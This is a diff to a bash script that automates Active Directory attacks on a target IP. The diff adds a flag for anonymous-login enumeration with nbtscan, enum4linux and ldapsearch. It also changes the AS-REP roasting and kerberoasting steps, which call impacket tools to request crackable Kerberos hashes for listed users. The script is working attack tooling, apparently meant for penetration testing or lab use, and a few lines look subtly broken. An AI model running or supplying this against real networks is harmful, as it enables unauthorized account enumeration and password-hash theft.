@@ -1,7 +1,7 @@
 #!/bin/bash
 # Check if the target IP is provided as an argument
 if [ -z "$1" ]; then
-    echo "Usage: $0 <target_ip>  [-u=<username>] [-p=<password>] [-d=<domain>] [-r=<filename>] [-b] [-v] "
+    echo "Usage: $0 <target_ip>  [-a ] [-u=<username>] [-p=<password>] [-d=<domain>] [-r=<file to use for asprep/kerberoasting>] [-b] [-v] "
     exit 1
 fi
 # Function to display verbose messages
@@ -23,9 +23,11 @@ bruteForceShares=false
 VERBOSE=false
 #asrep-roasting & kerberoasting
 roasting=""
+anonLoginEnum=false
 
-while getopts "u:p:d:r:bv" opt; do
+while getopts "au:p:d:r:bv" opt; do
   case $opt in
+    a) anonLoginEnum=true;;
     u) username=$OPTARG;;
     p) password=$OPTARG;;
     d) domain=$OPTARG;;
@@ -44,6 +46,7 @@ echo "bruteForceShares is set to: $bruteForceShares"
 echo "username is set to: $username"
 echo "IP address:" $TARGET_IP
 echo "ROasting:" $roasting
+echo "anonymouse login enumeration:" $anonLoginEnum
 # Display script header
 verbose_message "Script started."
 domainName=$(echo $domain | cut -d'.' -f1)
@@ -53,10 +56,12 @@ METASPLOIT_USERS="/usr/share/metasploit-framework/data/wordlists/unix_users.txt"
 verbose_message "Creating directories."
 mkdir -p nbtscan enum4linux smbclient rpcclient ldapsearch
 
+if [ "$anonLoginEnum" == "true" ]; then
 # This usually abuses anon login
-verbose_message "Running nbtscan and enum4linux."
-nbtscan -r "$TARGET_IP" > nbtscan/clientNcomputer
-enum4linux -a "$TARGET_IP" -u $username -p $password > enum4linux/index
+    verbose_message "Running nbtscan and enum4linux."
+    nbtscan -r "$TARGET_IP" > nbtscan/clientNcomputer
+    enum4linux -a "$TARGET_IP" -u $username -p $password > enum4linux/index
+fi
 #enum4linux -a "$TARGET_IP" -u $username -p $password | grep -i "User" > enum4linux/enumUser
 #BRUTE FORCE HERE
 if [ "$bruteForceShares" == "true" ]; then
@@ -90,17 +95,18 @@ if [ -n "$domain" ] && [ -n "$username" ] && [ -n "$password" ]; then
     ldapsearch -x -H ldap://${TARGET_IP} -D ${username} -w ${password} -b "CN=Account Operators,CN=Builtin,DC=$domainName,DC=$tld" > ldapsearch/AccountOPT
     ldapsearch -x -H ldap://${TARGET_IP} -b "DC=$domainName,DC=$tld" "(objectclass=organizationalUnit)" dn | grep "dn" ldapsearch/OU
 else
-    verbose_message "Running ldapsearch\(anon bind\)"
-    verbose_message "checking anonymous bind..."
-    ldapsearch -x -H ldap://${TARGET_IP} -D ${username} -w ${password} > ldapsearch/index
-    grep "bind must be completed" ldapsearch/index
-    if grep -q "bind must be completed" ldapsearch/index; then
-        echo "anonymous bind is ok"
-    else
-        verbose_message "anonymous bind is not present"
+    if [ "$anonLoginEnum" == "true" ]; then
+        verbose_message "Running ldapsearch\(anon bind\)"
+        verbose_message "checking anonymous bind..."
+        ldapsearch -x -H ldap://${TARGET_IP} -D ${username} -w ${password} > ldapsearch/index
+        if grep -q "bind must be completed" ldapsearch/index; then
+            echo "anonymous bind is ok"
+        else
+            verbose_message "anonymous bind is not present"
+        fi
+    fi
 fi
-fi
-if [ -n "$roasting" ] && [ -n "$username" ]; then
+if [ -n "$roasting" ] && [ -n "$domain" ]; then
     verbose_message "asreproast & kerberoasting users in ${roasting}"
     while IFS= read -r u; do
         verbose_message "$u"
@@ -108,8 +114,8 @@ if [ -n "$roasting" ] && [ -n "$username" ]; then
         #GetNPUsers.py can be used to retrieve domain users who do not have "Do not require Kerberos preauthentication" set and ask for their TGTs without knowing their passwords. 
         #It is then possible to attempt to crack the session key sent along the ticket to retrieve the user password. 
         #This attack is known as ASREProast.
-        impacket-GetNPUsers ${domainName}/${username} -request -format hashcat -outputfile ${u}asreproast.hashes
+        impacket-GetNPUsers ${domainName}/${u} -dc-ip ${TARGET_IP} -request -format hashcat -outputfile ${u}asreproast.hashes
         #get the SPNs on the domain; the given username is just for login thing(sometimes you don't need the password)
-        impacket-GetUserSPNs -dc-ip ${TARGET_IP} ${domainName}/${username} -request-user ${u} -save
+        impacket-GetUserSPNs -dc-ip ${TARGET_IP} ${domainName}/${u} -request-user ${u} -save
     done < "$roasting"
 fi
